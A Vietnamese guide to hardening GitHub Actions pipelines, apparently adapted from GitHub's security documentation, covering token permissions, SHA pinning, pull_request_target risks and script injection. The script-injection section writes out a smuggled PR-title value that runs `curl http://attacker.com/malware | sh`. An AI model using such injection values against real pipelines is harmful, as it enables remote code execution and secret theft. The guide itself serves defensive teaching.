# Bảo Mật Hệ Thống CI/CD: Khắc Phục Các Lỗ Hổng Bảo Mật GitHub Actions

*   **Tên bài viết gốc**: Security hardening for GitHub Actions
*   **Nguồn dịch**: [GitHub Security Blog / GitHub Docs](https://github.blog/category/security/) (Tài liệu chính thức và các khuyến nghị an ninh mạng bảo mật tối cao từ chính đội ngũ phát triển GitHub)
*   **Dịch thuật**: Dịch chuẩn xác, dễ hiểu sang văn phong chuyên nghiệp của kỹ sư DevSecOps Việt Nam.

---

## 1. Giới thiệu

Với sự trỗi dậy của xu hướng GitOps và tự động hóa, hệ thống CI/CD (như GitHub Actions) đã trở thành "trái tim" của mọi dự án phần mềm. Hệ thống này sở hữu đặc quyền truy cập tối cao: Nó chứa các Secrets để kết nối cơ sở dữ liệu, các SSH private keys để truy cập máy chủ, các Token để deploy lên AWS/Google Cloud, và có quyền ghi mã nguồn trực tiếp vào nhánh Production.

Chính vì sở hữu đặc quyền khổng lồ này, hệ thống CI/CD đã trở thành mục tiêu tấn công hàng đầu của các tin tặc chuyên nghiệp (ví dụ như các cuộc tấn công chuỗi cung ứng phần mềm nổi tiếng toàn cầu như SolarWinds).

Bài viết này tổng hợp các khuyến nghị bảo mật cốt lõi và các kỹ thuật gia cố an toàn hệ thống (Security Hardening) dành riêng cho GitHub Actions giúp bạn bảo vệ Pipeline của mình khỏi tin tặc.

---

## 2. Nguyên lý Đặc quyền tối thiểu cho các Token mặc định (`GITHUB_TOKEN`)

Mỗi khi một GitHub Actions workflow được kích hoạt, GitHub sẽ tự động tạo ra một mã xác thực tạm thời gọi là `GITHUB_TOKEN`. Token này được ứng dụng sử dụng để tương tác với kho lưu trữ (như tạo PR, ghi nhận comment, đóng gói releases...).

### A. Nguy cơ an ninh:
Mặc định trong nhiều dự án cũ, `GITHUB_TOKEN` được cấu hình quyền **Ghi và Đọc (Read/Write)** trên toàn bộ kho lưu trữ. Nếu workflow của bạn bị tin tặc can thiệp (ví dụ: thông qua một thư viện bên thứ ba độc hại được import vào quá trình test), chúng có thể chiếm quyền của Token này và ghi đè trực tiếp mã độc vào nhánh `main` hoặc xóa sạch repo.

### B. Giải pháp gia cố:
Luôn thiết lập nguyên lý đặc quyền tối thiểu bằng cách cấu hình cứng thuộc tính `permissions` trực tiếp trong tệp tin workflow YAML của bạn. Cấu hình này sẽ ghi đè quyền mặc định và chỉ cấp đúng những gì cần thiết:

```yaml
name: Secure CI/CD Pipeline

on: [push]

# Cấu hình cấm toàn bộ quyền mặc định ở mức Global
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

  release:
    runs-on: ubuntu-latest
    # Chỉ cấp quyền ghi (write) cho job cụ thể cần tạo Release
    permissions:
      contents: write
    steps:
      - name: Create Production Release
        uses: softprops/action-gh-release@v1
        with:
          tag_name: ${{ github.ref }}
```

---

## 3. Khóa cứng Phiên bản Actions bằng Mã băm SHA thay vì thẻ Tag

Khi sử dụng một Action do cộng đồng phát triển bên thứ ba (ví dụ: `actions/checkout` hoặc một action quét bảo mật), chúng ta thường gọi theo thẻ tag phiên bản:

*   ❌ *Tránh dùng:* `uses: actions/checkout@v4` hoặc nguy hiểm hơn là `@main` (gọi trực tiếp nhánh phát triển).
*   ✅ *Bắt buộc dùng:* `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11` (Khóa cứng bằng mã băm **Git SHA-1** 40 ký tự).

### A. Tại sao gọi theo Tag lại nguy hiểm?
Các thẻ Tag (như `v4`) trong Git là không cố định và hoàn toàn có thể bị thay đổi (mutable). 
*   Nếu tài khoản của lập trình viên sở hữu Action bên thứ ba đó bị tin tặc chiếm quyền điều khiển (Hijack), tin tặc có thể âm thầm chèn mã độc vào mã nguồn Action và xóa tag `v4` cũ để tạo lại tag `v4` trỏ vào commit chứa mã độc.
*   Pipeline của bạn sẽ tự động kéo Action nhiễm độc về chạy mà không hề có bất kỳ cảnh báo nào.
*   **Giải pháp:** Mã băm Git commit SHA là duy nhất và không bao giờ thay đổi (immutable). Việc khóa cứng bằng SHA bảo đảm 100% bạn đang chạy đúng đoạn mã nguồn đã được kiểm duyệt an toàn.

---

## 4. Kiểm soát chặt chẽ các workflows kích hoạt bởi PR từ bên ngoài (`pull_request_target`)

Sự kiện `on: pull_request` là sự kiện mặc định để chạy test khi có PR. Để bảo vệ an toàn, GitHub chạy sự kiện này trong một môi trường bị cô lập: Nó **không cho phép** truy cập vào các Secrets cấu hình của dự án và `GITHUB_TOKEN` chỉ có quyền Read-only.

### A. Lỗ hổng bỏ qua bảo mật:
Để thuận tiện cho việc chạy test tự động yêu cầu Secrets (ví dụ: chạy test liên quan đến API bên ngoài), nhiều nhà phát triển chuyển sang sử dụng sự kiện **`on: pull_request_target`**.
*   ⚠️ *Nguy hiểm tối cao:* Sự kiện này chạy workflow trong bối cảnh của nhánh đích (nhánh chính của bạn), cấp toàn bộ quyền truy cập vào Secrets của dự án và cấp quyền ghi cho `GITHUB_TOKEN`.
*   Nếu kẻ tấn công gửi một PR độc hại sửa đổi nội dung script chạy test (ví dụ sửa file `package.json` hoặc lệnh test trong Makefile) và workflow của bạn thực hiện checkout code của PR đó về chạy trực tiếp, mã độc của tin tặc sẽ được chạy dưới quyền đặc quyền của dự án bạn, đánh cắp toàn bộ Secrets cấu hình của doanh nghiệp gửi ra ngoài!

### B. Quy tắc phòng vệ:
1.  **Tuyệt đối cấm** sử dụng `pull_request_target` trừ khi bạn hiểu sâu sắc cơ chế bảo mật và thực hiện Code Review thủ công nghiêm ngặt trước khi chạy.
2.  Nếu bắt buộc phải chạy test có dùng Secrets cho PR từ bên ngoài, hãy sử dụng cơ chế phê duyệt thủ công: workflow chỉ được kích hoạt sau khi có nhãn phê duyệt `approved-to-run` từ đội ngũ quản trị dự án.

---

## 5. Phòng chống Lỗ hổng chèn mã độc Script Injection

Nếu workflow của bạn sử dụng dữ liệu nhập vào không đáng tin cậy (ví dụ: tiêu đề của PR, tên nhánh, nội dung issue do người dùng tự gõ) để ghép chuỗi chạy lệnh shell trực tiếp, hệ thống sẽ dính lỗ hổng **Script Injection** cực kỳ nghiêm trọng.

*   ❌ *Cách viết dính lỗ hổng chết người:*
    ```yaml
    - name: Print PR Title
      run: |
        echo "Tiêu đề PR: ${{ github.event.pull_request.title }}"
    ```
    Nếu kẻ tấn công đặt tiêu đề cho PR của chúng là: `test"; curl http://attacker.com/malware | sh; echo "`, câu lệnh shell chạy trên runner của bạn sẽ bị biến đổi thành:
    ```bash
    echo "Tiêu đề PR: test"; curl http://attacker.com/malware | sh; echo ""
    ```
    Mã độc lập tức được tải về và thực thi trực tiếp trên máy ảo runner của bạn!

*   ✅ *Cách viết an toàn tuyệt đối:*
    Luôn truyền dữ liệu nhập vào thông qua **Biến môi trường (Environment Variables)** thay vì ghép chuỗi trực tiếp. Bash sẽ coi giá trị của biến môi trường là dữ liệu thuần túy (data) chứ không phải là mã lệnh thực thi (code):
    ```yaml
    - name: Print PR Title Securely
      env:
        PR_TITLE: ${{ github.event.pull_request.title }}
      run: |
        echo "Tiêu đề PR: $PR_TITLE"
    ```

---

## 6. Kết luận

Hệ thống CI/CD GitHub Actions là chốt chặn quan trọng nhất của luồng cung ứng mã nguồn. Gia cố an toàn cho GitHub Actions không phải là một công việc làm một lần rồi bỏ qua, mà là một quy trình bắt buộc phải tuân thủ nghiêm ngặt. Bằng cách thiết lập đặc quyền tối thiểu cho `GITHUB_TOKEN`, khóa cứng các Actions bằng SHA commit băm, kiểm soát chặt chẽ luồng PR từ bên ngoài và phòng chống Script Injection bằng biến môi trường, bạn đã tạo nên một tấm khiên vững chắc bảo vệ tuyệt đối mã nguồn và tài sản số của doanh nghiệp.
